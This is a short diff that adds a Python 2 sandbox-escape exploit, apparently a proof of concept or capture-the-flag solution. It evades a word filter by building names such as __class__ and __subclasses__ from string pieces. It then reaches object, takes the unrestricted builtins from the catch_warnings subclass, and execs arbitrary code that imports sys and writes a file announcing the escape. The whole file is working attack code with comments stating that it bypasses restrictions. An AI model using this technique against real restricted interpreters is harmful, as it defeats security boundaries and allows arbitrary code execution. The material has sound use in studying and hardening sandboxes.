@@ -1,0 +1,25 @@
+#build prohibited word cl@ss by concatenating strings
+str = '__cla'
+str = str + 'ss__'
+
+#since object is not in builtins
+#get object cl@ss from first base cl@ss of a tuple
+object = ().__getattribute__(str).__bases__[0]
+
+#build prohibited word subcl@sses by concatenating strings
+str = '__subcla'
+str = str + 'sses__'
+
+#get builtins from the catch_warnings subcl@ss
+originalBuiltins = object.__getattribute__(object, str)()[60]()._module.__builtins__
+
+#create a new namespace that contains all the builtins
+namespace = {}
+namespace['__builtins__'] = originalBuiltins
+
+#exec any code by bypassing prohibited words using concatenated strings without any restrictions
+code = "im" + "port sys\n"
+code = code + "f = open('escaped.txt', 'w')\n"
+code = code + "f.write('I escaped your sandbox!')"
+
+exec code in namespace
